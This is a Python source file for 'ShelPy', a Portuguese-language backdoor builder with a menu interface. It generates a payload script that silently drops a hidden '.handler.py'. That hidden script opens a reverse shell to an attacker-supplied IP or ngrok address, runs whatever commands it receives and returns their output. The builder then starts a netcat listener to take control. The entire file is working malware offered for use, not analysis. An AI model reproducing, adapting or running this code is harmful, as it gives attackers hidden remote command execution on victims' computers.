#coding: utf-8
#Developer: Yuri Boeira (Derxs)
import os, time, socket

def criar():
	ngrok = input("\033[01;32m[*]\033[00;00m"+" Ngrok [y/n]> ")

	if ngrok == "y":
		ip = input("\033[01;34m[+]\033[00;00m"+" IP ngrok> ")
		porta = input("\033[01;34m[+]\033[00;00m"+" Porta ngrok> ")
		porta_hand = input("\033[01;34m[+]\033[00;00m"+" Porta handler> ")
		nome = input("\033[01;34m[+]\033[00;00m"+" Nome da backdoor> ")
		
		arquivo = open(nome+".py", "w")	
		
		print("\033[01;32m[*]\033[00;00m"+" Criando backdoor...")
		
		arquivo.write("""#coding: utf-8
import os, time

arq = open(".handler.py", "w")
arq.write('''#coding: utf-8
import socket, subprocess, os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

ip = "{}"
port = {}

try:
	s.connect((ip, port))
except ConnectionRefusedError:
	s.close()

if s:
	try:
		s.send(bytes("\033[01;31mShelPy>>>\033[00;00m ", 'utf-8'))
	except BrokenPipeError:
		pass

	while True:
		dados = s.recv(1024)

		proc = subprocess.Popen(dados, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

		saida = proc.stdout.read() + proc.stderr.read()

		try:
			s.send(bytes(saida))
			s.send(bytes("\033[01;31mShelPy>>>\033[00;00m ", 'utf-8'))
		except BrokenPipeError:
			pass

''')

arq.close()

os.system("python3 .handler.py &>> /dev/null")
		""".format(ip, porta))
	
		arquivo.close()

		print("\033[01;32m[*]\033[00;00m"+" Backdoor gerada!")
	
		print("\033[01;32m[*]\033[00;00m"+" Aguardando conexão...")

		os.system("nc -lp {}".format(porta_hand))

		main()
	else:
		ip = input("\033[01;34m[+]\033[00;00m"+" Seu IP> ")
	
		porta = input("\033[01;34m[+]\033[00;00m"+" Porta> ")
	
		nome = input("\033[01;34m[+]\033[00;00m"+" Nome da backdoor> ")
		arquivo = open(nome+".py", "w")
	
		print("\033[01;32m[*]\033[00;00m"+" Criando backdoor...")
	
		arquivo.write("""#coding: utf-8
import os, time

arq = open(".handler.py", "w")
arq.write('''#coding: utf-8
import socket, subprocess, os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

ip = "{}"
port = {}

try:
	s.connect((ip, port))
except ConnectionRefusedError:
	s.close()

if s:
	try:
		s.send(bytes("\033[01;31mShelPy>>>\033[00;00m ", 'utf-8'))
	except BrokenPipeError:
		pass

	while True:
		dados = s.recv(1024)

		proc = subprocess.Popen(dados, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

		saida = proc.stdout.read() + proc.stderr.read()

		try:
			s.send(bytes(saida))
			s.send(bytes("\033[01;31mShelPy>>>\033[00;00m ", 'utf-8'))
		except BrokenPipeError:
			pass

''')

arq.close()

os.system("python3 .handler.py &>> /dev/null")
		""".format(ip, porta))
	
		arquivo.close()

		print("\033[01;32m[*]\033[00;00m"+" Backdoor gerada!")
	
		print("\033[01;32m[*]\033[00;00m"+" Aguardando conexão...")

		os.system("nc -lp {}".format(porta))

		main()

def handler():
	porta = input("\033[01;34m[+]\033[00;00m"+" Porta> ")
	print("\033[01;32m[*]\033[00;00m"+" Aguardando conexão...")

	os.system("nc -lp {}".format(porta))

def main():
	print('''\033[01;31m
╔═╗┬ ┬┌─┐┬  ╔═╗┬ ┬
╚═╗├─┤├┤ │  ╠═╝└┬┘
╚═╝┴ ┴└─┘┴─┘╩   ┴ v1.1 by Derxs
\033[00;00m
\033[01;34m1)\033[00;00m Criar
\033[01;34m2)\033[00;00m Handler
\033[01;34m3)\033[00;00m Limpar tela
\033[01;34m4)\033[00;00m Sair
	''')

	try:
		opc = int(input("\033[01;35m[?]\033[00;00m ShelPy> "))
		if opc == 1:
			criar()
		elif opc == 2:
			handler()
		elif opc == 3:
			os.system("clear")
			main()
		else:
			exit(0)
	except ValueError:
		main()

flag = True

while flag:
	try:
		main()
	except KeyboardInterrupt:
		print("\n\033[01;31m[!]\033[00;00m"+" Você saiu!")
		flag = False
